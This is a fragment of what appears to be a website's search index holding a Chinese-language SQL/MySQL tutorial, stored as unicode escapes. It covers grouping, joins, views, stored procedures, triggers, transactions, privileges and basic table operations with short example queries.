WHERE \u8FC7\u6EE4\u884C\uFF0CHAVING \u8FC7\u6EE4\u5206\u7EC4\uFF0C\u884C\u8FC7\u6EE4\u5E94\u5F53\u5148\u4E8E\u5206\u7EC4\u8FC7\u6EE4\u3002
SELECT col, COUNT(*) AS num
FROM mytable
WHERE col > 2
GROUP BY col
HAVING num >= 2;
\u5206\u7EC4\u89C4\u5B9A\uFF1A GROUP BY \u5B50\u53E5\u51FA\u73B0\u5728 WHERE \u5B50\u53E5\u4E4B\u540E\uFF0CORDER BY \u5B50\u53E5\u4E4B\u524D\uFF1B
\u9664\u4E86\u6C47\u603B\u5B57\u6BB5\u5916\uFF0CSELECT \u8BED\u53E5\u4E2D\u7684\u6BCF\u4E00\u5B57\u6BB5\u90FD\u5FC5\u987B\u5728 GROUP BY \u5B50\u53E5\u4E2D\u7ED9\u51FA\uFF1B
NULL \u7684\u884C\u4F1A\u5355\u72EC\u5206\u4E3A\u4E00\u7EC4\uFF1B
\u5927\u591A\u6570 SQL \u5B9E\u73B0\u4E0D\u652F\u6301 GROUP BY \u5217\u5177\u6709\u53EF\u53D8\u957F\u5EA6\u7684\u6570\u636E\u7C7B\u578B\u3002`},{header:"\u5341\u56DB\u3001\u5B50\u67E5\u8BE2",slug:"\u5341\u56DB\u3001\u5B50\u67E5\u8BE2",content:`\u5B50\u67E5\u8BE2\u4E2D\u53EA\u80FD\u8FD4\u56DE\u4E00\u4E2A\u5B57\u6BB5\u7684\u6570\u636E\u3002
\u53EF\u4EE5\u5C06\u5B50\u67E5\u8BE2\u7684\u7ED3\u679C\u4F5C\u4E3A WHRER \u8BED\u53E5\u7684\u8FC7\u6EE4\u6761\u4EF6\uFF1A
SELECT *
FROM mytable1
WHERE col1 IN (SELECT col2 FROM mytable2);
\u4E0B\u9762\u7684\u8BED\u53E5\u53EF\u4EE5\u68C0\u7D22\u51FA\u5BA2\u6237\u7684\u8BA2\u5355\u6570\u91CF\uFF0C\u5B50\u67E5\u8BE2\u8BED\u53E5\u4F1A\u5BF9\u7B2C\u4E00\u4E2A\u67E5\u8BE2\u68C0\u7D22\u51FA\u7684\u6BCF\u4E2A\u5BA2\u6237\u6267\u884C\u4E00\u6B21\uFF1A
SELECT cust_name, (SELECT COUNT(*) FROM Orders WHERE Orders.cust_id = Customers.cust_id) AS orders_num
FROM Customers
ORDER BY cust_name;`},{header:"\u5341\u4E94\u3001\u8FDE\u63A5",slug:"\u5341\u4E94\u3001\u8FDE\u63A5",content:`\u8FDE\u63A5\u7528\u4E8E\u8FDE\u63A5\u591A\u4E2A\u8868\uFF0C\u4F7F\u7528 JOIN \u5173\u952E\u5B57\uFF0C\u5E76\u4E14\u6761\u4EF6\u8BED\u53E5\u4F7F\u7528 ON \u800C\u4E0D\u662F WHERE\u3002
\u8FDE\u63A5\u53EF\u4EE5\u66FF\u6362\u5B50\u67E5\u8BE2\uFF0C\u5E76\u4E14\u6BD4\u5B50\u67E5\u8BE2\u7684\u6548\u7387\u4E00\u822C\u4F1A\u66F4\u5FEB\u3002
\u53EF\u4EE5\u7528 AS \u7ED9\u5217\u540D\u3001\u8BA1\u7B97\u5B57\u6BB5\u548C\u8868\u540D\u53D6\u522B\u540D\uFF0C\u7ED9\u8868\u540D\u53D6\u522B\u540D\u662F\u4E3A\u4E86\u7B80\u5316 SQL \u8BED\u53E5\u4EE5\u53CA\u8FDE\u63A5\u76F8\u540C\u8868\u3002`},{header:"\u5185\u8FDE\u63A5",slug:"\u5185\u8FDE\u63A5",content:`\u5185\u8FDE\u63A5\u53C8\u79F0\u7B49\u503C\u8FDE\u63A5\uFF0C\u4F7F\u7528 INNER JOIN \u5173\u952E\u5B57\u3002
SELECT A.value, B.value
FROM tablea AS A INNER JOIN tableb AS B
ON A.key = B.key;
\u53EF\u4EE5\u4E0D\u660E\u786E\u4F7F\u7528 INNER JOIN\uFF0C\u800C\u4F7F\u7528\u666E\u901A\u67E5\u8BE2\u5E76\u5728 WHERE \u4E2D\u5C06\u4E24\u4E2A\u8868\u4E2D\u8981\u8FDE\u63A5\u7684\u5217\u7528\u7B49\u503C\u65B9\u6CD5\u8FDE\u63A5\u8D77\u6765\u3002
SELECT A.value, B.value
FROM tablea AS A, tableb AS B
WHERE A.key = B.key;`},{header:"\u81EA\u8FDE\u63A5",slug:"\u81EA\u8FDE\u63A5",content:`\u81EA\u8FDE\u63A5\u53EF\u4EE5\u770B\u6210\u5185\u8FDE\u63A5\u7684\u4E00\u79CD\uFF0C\u53EA\u662F\u8FDE\u63A5\u7684\u8868\u662F\u81EA\u8EAB\u800C\u5DF2\u3002
\u4E00\u5F20\u5458\u5DE5\u8868\uFF0C\u5305\u542B\u5458\u5DE5\u59D3\u540D\u548C\u5458\u5DE5\u6240\u5C5E\u90E8\u95E8\uFF0C\u8981\u627E\u51FA\u4E0E Jim \u5904\u5728\u540C\u4E00\u90E8\u95E8\u7684\u6240\u6709\u5458\u5DE5\u59D3\u540D\u3002
\u5B50\u67E5\u8BE2\u7248\u672C
SELECT name
FROM employee
WHERE department = ( SELECT department FROM employee WHERE name = "Jim");
\u81EA\u8FDE\u63A5\u7248\u672C
SELECT e1.name
FROM employee AS e1 INNER JOIN employee AS e2
ON e1.department = e2.department AND e2.name = "Jim";`},{header:"\u81EA\u7136\u8FDE\u63A5",slug:"\u81EA\u7136\u8FDE\u63A5",content:`\u81EA\u7136\u8FDE\u63A5\u662F\u628A\u540C\u540D\u5217\u901A\u8FC7\u7B49\u503C\u6D4B\u8BD5\u8FDE\u63A5\u8D77\u6765\u7684\uFF0C\u540C\u540D\u5217\u53EF\u4EE5\u6709\u591A\u4E2A\u3002
\u5185\u8FDE\u63A5\u548C\u81EA\u7136\u8FDE\u63A5\u7684\u533A\u522B\uFF1A\u5185\u8FDE\u63A5\u63D0\u4F9B\u8FDE\u63A5\u7684\u5217\uFF0C\u800C\u81EA\u7136\u8FDE\u63A5\u81EA\u52A8\u8FDE\u63A5\u6240\u6709\u540C\u540D\u5217\u3002
SELECT A.value, B.value
FROM tablea AS A NATURAL JOIN tableb AS B;`},{header:"\u5916\u8FDE\u63A5",slug:"\u5916\u8FDE\u63A5",content:`\u5916\u8FDE\u63A5\u4FDD\u7559\u4E86\u6CA1\u6709\u5173\u8054\u7684\u90A3\u4E9B\u884C\u3002\u5206\u4E3A\u5DE6\u5916\u8FDE\u63A5\uFF0C\u53F3\u5916\u8FDE\u63A5\u4EE5\u53CA\u5168\u5916\u8FDE\u63A5\uFF0C\u5DE6\u5916\u8FDE\u63A5\u5C31\u662F\u4FDD\u7559\u5DE6\u8868\u6CA1\u6709\u5173\u8054\u7684\u884C\u3002
\u68C0\u7D22\u6240\u6709\u987E\u5BA2\u7684\u8BA2\u5355\u4FE1\u606F\uFF0C\u5305\u62EC\u8FD8\u6CA1\u6709\u8BA2\u5355\u4FE1\u606F\u7684\u987E\u5BA2\u3002
SELECT Customers.cust_id, Customer.cust_name, Orders.order_id
FROM Customers LEFT OUTER JOIN Orders
ON Customers.cust_id = Orders.cust_id;
customers \u8868\uFF1A cust_id
cust_name 1
a 2
b 3
c orders \u8868\uFF1A order_id
cust_id 1
1 2
1 3
3 4
3 \u7ED3\u679C\uFF1A cust_id
cust_name
order_id 1
a
1 1
a
2 3
c
3 3
c
4 2
b
Null`},{header:"\u5341\u516D\u3001\u7EC4\u5408\u67E5\u8BE2",slug:"\u5341\u516D\u3001\u7EC4\u5408\u67E5\u8BE2",content:`\u4F7F\u7528 UNION \u6765\u7EC4\u5408\u4E24\u4E2A\u67E5\u8BE2\uFF0C\u5982\u679C\u7B2C\u4E00\u4E2A\u67E5\u8BE2\u8FD4\u56DE M \u884C\uFF0C\u7B2C\u4E8C\u4E2A\u67E5\u8BE2\u8FD4\u56DE N \u884C\uFF0C\u90A3\u4E48\u7EC4\u5408\u67E5\u8BE2\u7684\u7ED3\u679C\u4E00\u822C\u4E3A M+N \u884C\u3002
\u6BCF\u4E2A\u67E5\u8BE2\u5FC5\u987B\u5305\u542B\u76F8\u540C\u7684\u5217\u3001\u8868\u8FBE\u5F0F\u548C\u805A\u96C6\u51FD\u6570\u3002
\u9ED8\u8BA4\u4F1A\u53BB\u9664\u76F8\u540C\u884C\uFF0C\u5982\u679C\u9700\u8981\u4FDD\u7559\u76F8\u540C\u884C\uFF0C\u4F7F\u7528 UNION ALL\u3002
\u53EA\u80FD\u5305\u542B\u4E00\u4E2A ORDER BY \u5B50\u53E5\uFF0C\u5E76\u4E14\u5FC5\u987B\u4F4D\u4E8E\u8BED\u53E5\u7684\u6700\u540E\u3002
SELECT col
FROM mytable
WHERE col = 1
UNION
SELECT col
FROM mytable
WHERE col =2;`},{header:"\u5341\u4E03\u3001\u89C6\u56FE",slug:"\u5341\u4E03\u3001\u89C6\u56FE",content:`\u89C6\u56FE\u662F\u865A\u62DF\u7684\u8868\uFF0C\u672C\u8EAB\u4E0D\u5305\u542B\u6570\u636E\uFF0C\u4E5F\u5C31\u4E0D\u80FD\u5BF9\u5176\u8FDB\u884C\u7D22\u5F15\u64CD\u4F5C\u3002
\u5BF9\u89C6\u56FE\u7684\u64CD\u4F5C\u548C\u5BF9\u666E\u901A\u8868\u7684\u64CD\u4F5C\u4E00\u6837\u3002
\u89C6\u56FE\u5177\u6709\u5982\u4E0B\u597D\u5904\uFF1A \u7B80\u5316\u590D\u6742\u7684 SQL \u64CD\u4F5C\uFF0C\u6BD4\u5982\u590D\u6742\u7684\u8FDE\u63A5\uFF1B
\u53EA\u4F7F\u7528\u5B9E\u9645\u8868\u7684\u4E00\u90E8\u5206\u6570\u636E\uFF1B
\u901A\u8FC7\u53EA\u7ED9\u7528\u6237\u8BBF\u95EE\u89C6\u56FE\u7684\u6743\u9650\uFF0C\u4FDD\u8BC1\u6570\u636E\u7684\u5B89\u5168\u6027\uFF1B
\u66F4\u6539\u6570\u636E\u683C\u5F0F\u548C\u8868\u793A\u3002 CREATE VIEW myview AS
SELECT Concat(col1, col2) AS concat_col, col3*col4 AS compute_col
FROM mytable
WHERE col5 = val;`},{header:"\u5341\u516B\u3001\u5B58\u50A8\u8FC7\u7A0B",slug:"\u5341\u516B\u3001\u5B58\u50A8\u8FC7\u7A0B",content:`\u5B58\u50A8\u8FC7\u7A0B\u53EF\u4EE5\u770B\u6210\u662F\u5BF9\u4E00\u7CFB\u5217 SQL \u64CD\u4F5C\u7684\u6279\u5904\u7406\u3002
\u4F7F\u7528\u5B58\u50A8\u8FC7\u7A0B\u7684\u597D\u5904\uFF1A \u4EE3\u7801\u5C01\u88C5\uFF0C\u4FDD\u8BC1\u4E86\u4E00\u5B9A\u7684\u5B89\u5168\u6027\uFF1B
\u4EE3\u7801\u590D\u7528\uFF1B
\u7531\u4E8E\u662F\u9884\u5148\u7F16\u8BD1\uFF0C\u56E0\u6B64\u5177\u6709\u5F88\u9AD8\u7684\u6027\u80FD\u3002 \u547D\u4EE4\u884C\u4E2D\u521B\u5EFA\u5B58\u50A8\u8FC7\u7A0B\u9700\u8981\u81EA\u5B9A\u4E49\u5206\u9694\u7B26\uFF0C\u56E0\u4E3A\u547D\u4EE4\u884C\u662F\u4EE5 ; \u4E3A\u7ED3\u675F\u7B26\uFF0C\u800C\u5B58\u50A8\u8FC7\u7A0B\u4E2D\u4E5F\u5305\u542B\u4E86\u5206\u53F7\uFF0C\u56E0\u6B64\u4F1A\u9519\u8BEF\u628A\u8FD9\u90E8\u5206\u5206\u53F7\u5F53\u6210\u662F\u7ED3\u675F\u7B26\uFF0C\u9020\u6210\u8BED\u6CD5\u9519\u8BEF\u3002
\u5305\u542B in\u3001out \u548C inout \u4E09\u79CD\u53C2\u6570\u3002
\u7ED9\u53D8\u91CF\u8D4B\u503C\u90FD\u9700\u8981\u7528 select into \u8BED\u53E5\u3002
\u6BCF\u6B21\u53EA\u80FD\u7ED9\u4E00\u4E2A\u53D8\u91CF\u8D4B\u503C\uFF0C\u4E0D\u652F\u6301\u96C6\u5408\u7684\u64CD\u4F5C\u3002
delimiter // create procedure myprocedure( out ret int ) begin declare y int; select sum(col1) from mytable into y; select y*y into ret; end // delimiter ;
call myprocedure(@ret);
select @ret;`},{header:"\u5341\u4E5D\u3001\u6E38\u6807",slug:"\u5341\u4E5D\u3001\u6E38\u6807",content:`\u5728\u5B58\u50A8\u8FC7\u7A0B\u4E2D\u4F7F\u7528\u6E38\u6807\u53EF\u4EE5\u5BF9\u4E00\u4E2A\u7ED3\u679C\u96C6\u8FDB\u884C\u79FB\u52A8\u904D\u5386\u3002
\u6E38\u6807\u4E3B\u8981\u7528\u4E8E\u4EA4\u4E92\u5F0F\u5E94\u7528\uFF0C\u5176\u4E2D\u7528\u6237\u9700\u8981\u5BF9\u6570\u636E\u96C6\u4E2D\u7684\u4EFB\u610F\u884C\u8FDB\u884C\u6D4F\u89C8\u548C\u4FEE\u6539\u3002
\u4F7F\u7528\u6E38\u6807\u7684\u56DB\u4E2A\u6B65\u9AA4\uFF1A \u58F0\u660E\u6E38\u6807\uFF0C\u8FD9\u4E2A\u8FC7\u7A0B\u6CA1\u6709\u5B9E\u9645\u68C0\u7D22\u51FA\u6570\u636E\uFF1B
\u6253\u5F00\u6E38\u6807\uFF1B
\u53D6\u51FA\u6570\u636E\uFF1B
\u5173\u95ED\u6E38\u6807\uFF1B delimiter //
create procedure myprocedure(out ret int) begin declare done boolean default 0; declare mycursor cursor for select col1 from mytable; # \u5B9A\u4E49\u4E86\u4E00\u4E2A continue handler\uFF0C\u5F53 sqlstate '02000' \u8FD9\u4E2A\u6761\u4EF6\u51FA\u73B0\u65F6\uFF0C\u4F1A\u6267\u884C set done = 1 declare continue handler for sqlstate '02000' set done = 1; open mycursor; repeat fetch mycursor into ret; select ret; until done end repeat; close mycursor; end // delimiter ;`},{header:"\u4E8C\u5341\u3001\u89E6\u53D1\u5668",slug:"\u4E8C\u5341\u3001\u89E6\u53D1\u5668",content:`\u89E6\u53D1\u5668\u4F1A\u5728\u67D0\u4E2A\u8868\u6267\u884C\u4EE5\u4E0B\u8BED\u53E5\u65F6\u800C\u81EA\u52A8\u6267\u884C\uFF1ADELETE\u3001INSERT\u3001UPDATE\u3002
\u89E6\u53D1\u5668\u5FC5\u987B\u6307\u5B9A\u5728\u8BED\u53E5\u6267\u884C\u4E4B\u524D\u8FD8\u662F\u4E4B\u540E\u81EA\u52A8\u6267\u884C\uFF0C\u4E4B\u524D\u6267\u884C\u4F7F\u7528 BEFORE \u5173\u952E\u5B57\uFF0C\u4E4B\u540E\u6267\u884C\u4F7F\u7528 AFTER \u5173\u952E\u5B57\u3002BEFORE \u7528\u4E8E\u6570\u636E\u9A8C\u8BC1\u548C\u51C0\u5316\uFF0CAFTER \u7528\u4E8E\u5BA1\u8BA1\u8DDF\u8E2A\uFF0C\u5C06\u4FEE\u6539\u8BB0\u5F55\u5230\u53E6\u5916\u4E00\u5F20\u8868\u4E2D\u3002
INSERT \u89E6\u53D1\u5668\u5305\u542B\u4E00\u4E2A\u540D\u4E3A NEW \u7684\u865A\u62DF\u8868\u3002
CREATE TRIGGER mytrigger AFTER INSERT ON mytable
FOR EACH ROW SELECT NEW.col into @result; SELECT @result; -- \u83B7\u53D6\u7ED3\u679C
DELETE \u89E6\u53D1\u5668\u5305\u542B\u4E00\u4E2A\u540D\u4E3A OLD \u7684\u865A\u62DF\u8868\uFF0C\u5E76\u4E14\u662F\u53EA\u8BFB\u7684\u3002
UPDATE \u89E6\u53D1\u5668\u5305\u542B\u4E00\u4E2A\u540D\u4E3A NEW \u548C\u4E00\u4E2A\u540D\u4E3A OLD \u7684\u865A\u62DF\u8868\uFF0C\u5176\u4E2D NEW \u662F\u53EF\u4EE5\u88AB\u4FEE\u6539\u7684\uFF0C\u800C OLD \u662F\u53EA\u8BFB\u7684\u3002
MySQL \u4E0D\u5141\u8BB8\u5728\u89E6\u53D1\u5668\u4E2D\u4F7F\u7528 CALL \u8BED\u53E5\uFF0C\u4E5F\u5C31\u662F\u4E0D\u80FD\u8C03\u7528\u5B58\u50A8\u8FC7\u7A0B\u3002`},{header:"\u4E8C\u5341\u4E00\u3001\u4E8B\u52A1\u7BA1\u7406",slug:"\u4E8C\u5341\u4E00\u3001\u4E8B\u52A1\u7BA1\u7406",content:`\u57FA\u672C\u672F\u8BED\uFF1A \u4E8B\u52A1\uFF08transaction\uFF09\u6307\u4E00\u7EC4 SQL \u8BED\u53E5\uFF1B
\u56DE\u9000\uFF08rollback\uFF09\u6307\u64A4\u9500\u6307\u5B9A SQL \u8BED\u53E5\u7684\u8FC7\u7A0B\uFF1B
\u63D0\u4EA4\uFF08commit\uFF09\u6307\u5C06\u672A\u5B58\u50A8\u7684 SQL \u8BED\u53E5\u7ED3\u679C\u5199\u5165\u6570\u636E\u5E93\u8868\uFF1B
\u4FDD\u7559\u70B9\uFF08savepoint\uFF09\u6307\u4E8B\u52A1\u5904\u7406\u4E2D\u8BBE\u7F6E\u7684\u4E34\u65F6\u5360\u4F4D\u7B26\uFF08placeholder\uFF09\uFF0C\u4F60\u53EF\u4EE5\u5BF9\u5B83\u53D1\u5E03\u56DE\u9000\uFF08\u4E0E\u56DE\u9000\u6574\u4E2A\u4E8B\u52A1\u5904\u7406\u4E0D\u540C\uFF09\u3002 \u4E0D\u80FD\u56DE\u9000 SELECT \u8BED\u53E5\uFF0C\u56DE\u9000 SELECT \u8BED\u53E5\u4E5F\u6CA1\u610F\u4E49\uFF1B\u4E5F\u4E0D\u80FD\u56DE\u9000 CREATE \u548C DROP \u8BED\u53E5\u3002
MySQL \u7684\u4E8B\u52A1\u63D0\u4EA4\u9ED8\u8BA4\u662F\u9690\u5F0F\u63D0\u4EA4\uFF0C\u6BCF\u6267\u884C\u4E00\u6761\u8BED\u53E5\u5C31\u628A\u8FD9\u6761\u8BED\u53E5\u5F53\u6210\u4E00\u4E2A\u4E8B\u52A1\u7136\u540E\u8FDB\u884C\u63D0\u4EA4\u3002\u5F53\u51FA\u73B0 START TRANSACTION \u8BED\u53E5\u65F6\uFF0C\u4F1A\u5173\u95ED\u9690\u5F0F\u63D0\u4EA4\uFF1B\u5F53 COMMIT \u6216 ROLLBACK \u8BED\u53E5\u6267\u884C\u540E\uFF0C\u4E8B\u52A1\u4F1A\u81EA\u52A8\u5173\u95ED\uFF0C\u91CD\u65B0\u6062\u590D\u9690\u5F0F\u63D0\u4EA4\u3002
\u8BBE\u7F6E autocommit \u4E3A 0 \u53EF\u4EE5\u53D6\u6D88\u81EA\u52A8\u63D0\u4EA4\uFF1Bautocommit \u6807\u8BB0\u662F\u9488\u5BF9\u6BCF\u4E2A\u8FDE\u63A5\u800C\u4E0D\u662F\u9488\u5BF9\u670D\u52A1\u5668\u7684\u3002
\u5982\u679C\u6CA1\u6709\u8BBE\u7F6E\u4FDD\u7559\u70B9\uFF0CROLLBACK \u4F1A\u56DE\u9000\u5230 START TRANSACTION \u8BED\u53E5\u5904\uFF1B\u5982\u679C\u8BBE\u7F6E\u4E86\u4FDD\u7559\u70B9\uFF0C\u5E76\u4E14\u5728 ROLLBACK \u4E2D\u6307\u5B9A\u8BE5\u4FDD\u7559\u70B9\uFF0C\u5219\u4F1A\u56DE\u9000\u5230\u8BE5\u4FDD\u7559\u70B9\u3002
START TRANSACTION
// ...
SAVEPOINT delete1
// ...
ROLLBACK TO delete1
// ...
COMMIT`},{header:"\u4E8C\u5341\u4E8C\u3001\u5B57\u7B26\u96C6",slug:"\u4E8C\u5341\u4E8C\u3001\u5B57\u7B26\u96C6",content:`\u57FA\u672C\u672F\u8BED\uFF1A \u5B57\u7B26\u96C6\u4E3A\u5B57\u6BCD\u548C\u7B26\u53F7\u7684\u96C6\u5408\uFF1B
\u7F16\u7801\u4E3A\u67D0\u4E2A\u5B57\u7B26\u96C6\u6210\u5458\u7684\u5185\u90E8\u8868\u793A\uFF1B
\u6821\u5BF9\u5B57\u7B26\u6307\u5B9A\u5982\u4F55\u6BD4\u8F83\uFF0C\u4E3B\u8981\u7528\u4E8E\u6392\u5E8F\u548C\u5206\u7EC4\u3002 \u9664\u4E86\u7ED9\u8868\u6307\u5B9A\u5B57\u7B26\u96C6\u548C\u6821\u5BF9\u5916\uFF0C\u4E5F\u53EF\u4EE5\u7ED9\u5217\u6307\u5B9A\uFF1A
CREATE TABLE mytable
(col VARCHAR(10) CHARACTER SET latin COLLATE latin1_general_ci )
DEFAULT CHARACTER SET hebrew COLLATE hebrew_general_ci;
\u53EF\u4EE5\u5728\u6392\u5E8F\u3001\u5206\u7EC4\u65F6\u6307\u5B9A\u6821\u5BF9\uFF1A
SELECT *
FROM mytable
ORDER BY col COLLATE latin1_general_ci;`},{header:"\u4E8C\u5341\u4E09\u3001\u6743\u9650\u7BA1\u7406",slug:"\u4E8C\u5341\u4E09\u3001\u6743\u9650\u7BA1\u7406",content:`MySQL \u7684\u8D26\u6237\u4FE1\u606F\u4FDD\u5B58\u5728 mysql \u8FD9\u4E2A\u6570\u636E\u5E93\u4E2D\u3002
USE mysql;
SELECT user FROM user;
\u521B\u5EFA\u8D26\u6237
\u65B0\u521B\u5EFA\u7684\u8D26\u6237\u6CA1\u6709\u4EFB\u4F55\u6743\u9650\u3002
CREATE USER myuser IDENTIFIED BY 'mypassword';
\u4FEE\u6539\u8D26\u6237\u540D
RENAME USER myuser TO newuser;
\u5220\u9664\u8D26\u6237
DROP USER myuser;
\u67E5\u770B\u6743\u9650
SHOW GRANTS FOR myuser;
\u6388\u4E88\u6743\u9650
\u8D26\u6237\u7528 username@host \u7684\u5F62\u5F0F\u5B9A\u4E49\uFF0Cusername@% \u4F7F\u7528\u7684\u662F\u9ED8\u8BA4\u4E3B\u673A\u540D\u3002
GRANT SELECT, INSERT ON mydatabase.* TO myuser;
\u5220\u9664\u6743\u9650
GRANT \u548C REVOKE \u53EF\u5728\u51E0\u4E2A\u5C42\u6B21\u4E0A\u63A7\u5236\u8BBF\u95EE\u6743\u9650\uFF1A \u6574\u4E2A\u670D\u52A1\u5668\uFF0C\u4F7F\u7528 GRANT ALL \u548C REVOKE ALL\uFF1B
\u6574\u4E2A\u6570\u636E\u5E93\uFF0C\u4F7F\u7528 ON database.*\uFF1B
\u7279\u5B9A\u7684\u8868\uFF0C\u4F7F\u7528 ON database.table\uFF1B
\u7279\u5B9A\u7684\u5217\uFF1B
\u7279\u5B9A\u7684\u5B58\u50A8\u8FC7\u7A0B\u3002 REVOKE SELECT, INSERT ON mydatabase.* FROM myuser;
\u66F4\u6539\u5BC6\u7801
\u5FC5\u987B\u4F7F\u7528 Password() \u51FD\u6570\u8FDB\u884C\u52A0\u5BC6\u3002
SET PASSWROD FOR myuser = Password('new_password');`},{header:"\u53C2\u8003\u8D44\u6599",slug:"\u53C2\u8003\u8D44\u6599",content:"BenForta. SQL \u5FC5\u77E5\u5FC5\u4F1A [M]. \u4EBA\u6C11\u90AE\u7535\u51FA\u7248\u793E, 2013."}]},{path:"/java/SQL.html",title:"\u4E00\u3001\u57FA\u7840",pathLocale:"/",contents:[{header:"",slug:"",content:`\u4E00\u3001\u57FA\u7840
\u4E8C\u3001\u521B\u5EFA\u8868
\u4E09\u3001\u4FEE\u6539\u8868
\u56DB\u3001\u63D2\u5165
\u4E94\u3001\u66F4\u65B0
\u516D\u3001\u5220\u9664
\u4E03\u3001\u67E5\u8BE2 DISTINCT
LIMIT \u516B\u3001\u6392\u5E8F
\u4E5D\u3001\u8FC7\u6EE4
\u5341\u3001\u901A\u914D\u7B26
\u5341\u4E00\u3001\u8BA1\u7B97\u5B57\u6BB5
\u5341\u4E8C\u3001\u51FD\u6570 \u6C47\u603B
\u6587\u672C\u5904\u7406
\u65E5\u671F\u548C\u65F6\u95F4\u5904\u7406
\u6570\u503C\u5904\u7406 \u5341\u4E09\u3001\u5206\u7EC4
\u5341\u56DB\u3001\u5B50\u67E5\u8BE2
\u5341\u4E94\u3001\u8FDE\u63A5 \u5185\u8FDE\u63A5
\u81EA\u8FDE\u63A5
\u81EA\u7136\u8FDE\u63A5
\u5916\u8FDE\u63A5 \u5341\u516D\u3001\u7EC4\u5408\u67E5\u8BE2
\u5341\u4E03\u3001\u89C6\u56FE
\u5341\u516B\u3001\u5B58\u50A8\u8FC7\u7A0B
\u5341\u4E5D\u3001\u6E38\u6807
\u4E8C\u5341\u3001\u89E6\u53D1\u5668
\u4E8C\u5341\u4E00\u3001\u4E8B\u52A1\u7BA1\u7406
\u4E8C\u5341\u4E8C\u3001\u5B57\u7B26\u96C6
\u4E8C\u5341\u4E09\u3001\u6743\u9650\u7BA1\u7406
\u53C2\u8003\u8D44\u6599`},{header:"\u4E00\u3001\u57FA\u7840",slug:"\u4E00\u3001\u57FA\u7840",content:`\u6A21\u5F0F\u5B9A\u4E49\u4E86\u6570\u636E\u5982\u4F55\u5B58\u50A8\u3001\u5B58\u50A8\u4EC0\u4E48\u6837\u7684\u6570\u636E\u4EE5\u53CA\u6570\u636E\u5982\u4F55\u5206\u89E3\u7B49\u4FE1\u606F\uFF0C\u6570\u636E\u5E93\u548C\u8868\u90FD\u6709\u6A21\u5F0F\u3002
\u4E3B\u952E\u7684\u503C\u4E0D\u5141\u8BB8\u4FEE\u6539\uFF0C\u4E5F\u4E0D\u5141\u8BB8\u590D\u7528\uFF08\u4E0D\u80FD\u5C06\u5DF2\u7ECF\u5220\u9664\u7684\u4E3B\u952E\u503C\u8D4B\u7ED9\u65B0\u6570\u636E\u884C\u7684\u4E3B\u952E\uFF09\u3002
SQL\uFF08Structured Query Language)\uFF0C\u6807\u51C6 SQL \u7531 ANSI \u6807\u51C6\u59D4\u5458\u4F1A\u7BA1\u7406\uFF0C\u4ECE\u800C\u79F0\u4E3A ANSI SQL\u3002\u5404\u4E2A DBMS \u90FD\u6709\u81EA\u5DF1\u7684\u5B9E\u73B0\uFF0C\u5982 PL/SQL\u3001Transact-SQL \u7B49\u3002
SQL \u8BED\u53E5\u4E0D\u533A\u5206\u5927\u5C0F\u5199\uFF0C\u4F46\u662F\u6570\u636E\u5E93\u8868\u540D\u3001\u5217\u540D\u548C\u503C\u662F\u5426\u533A\u5206\u4F9D\u8D56\u4E8E\u5177\u4F53\u7684 DBMS \u4EE5\u53CA\u914D\u7F6E\u3002
SQL \u652F\u6301\u4EE5\u4E0B\u4E09\u79CD\u6CE8\u91CA\uFF1A
# \u6CE8\u91CA
SELECT *
FROM mytable; -- \u6CE8\u91CA
/* \u6CE8\u91CA1 \u6CE8\u91CA2 */
\u6570\u636E\u5E93\u521B\u5EFA\u4E0E\u4F7F\u7528\uFF1A
CREATE DATABASE test;
USE test;`},{header:"\u4E8C\u3001\u521B\u5EFA\u8868",slug:"\u4E8C\u3001\u521B\u5EFA\u8868",content:"CREATE TABLE mytable ( # int \u7C7B\u578B\uFF0C\u4E0D\u4E3A\u7A7A\uFF0C\u81EA\u589E id INT NOT NULL AUTO_INCREMENT, # int \u7C7B\u578B\uFF0C\u4E0D\u53EF\u4E3A\u7A7A\uFF0C\u9ED8\u8BA4\u503C\u4E3A 1\uFF0C\u4E0D\u4E3A\u7A7A col1 INT NOT NULL DEFAULT 1, # \u53D8\u957F\u5B57\u7B26\u4E32\u7C7B\u578B\uFF0C\u6700\u957F\u4E3A 45 \u4E2A\u5B57\u7B26\uFF0C\u53EF\u4EE5\u4E3A\u7A7A col2 VARCHAR(45) NULL, # \u65E5\u671F\u7C7B\u578B\uFF0C\u53EF\u4E3A\u7A7A col3 DATE NULL, # \u8BBE\u7F6E\u4E3B\u952E\u4E3A id PRIMARY KEY (`id`));"},{header:"\u4E09\u3001\u4FEE\u6539\u8868",slug:"\u4E09\u3001\u4FEE\u6539\u8868",content:`\u6DFB\u52A0\u5217
ALTER TABLE mytable
ADD col CHAR(20);
\u5220\u9664\u5217
ALTER TABLE mytable
DROP COLUMN col;
\u5220\u9664\u8868
DROP TABLE mytable;`},{header:"\u56DB\u3001\u63D2\u5165",slug:"\u56DB\u3001\u63D2\u5165",content:`\u666E\u901A\u63D2\u5165
INSERT INTO mytable(col1, col2)
VALUES(val1, val2);
\u63D2\u5165\u68C0\u7D22\u51FA\u6765\u7684\u6570\u636E
INSERT INTO mytable1(col1, col2)
SELECT col1, col2
FROM mytable2;
\u5C06\u4E00\u4E2A\u8868\u7684\u5185\u5BB9\u63D2\u5165\u5230\u4E00\u4E2A\u65B0\u8868
CREATE TABLE newtable AS
SELECT * FROM mytable;`},{header:"\u4E94\u3001\u66F4\u65B0",slug:"\u4E94\u3001\u66F4\u65B0",content:`UPDATE mytable
SET col = val
WHERE id = 1;`},{header:"\u516D\u3001\u5220\u9664",slug:"\u516D\u3001\u5220\u9664",content:`DELETE FROM mytable
WHERE id = 1;
TRUNCATE TABLE \u53EF\u4EE5\u6E05\u7A7A\u8868\uFF0C\u4E5F\u5C31\u662F\u5220\u9664\u6240\u6709\u884C\u3002
TRUNCATE TABLE mytable;
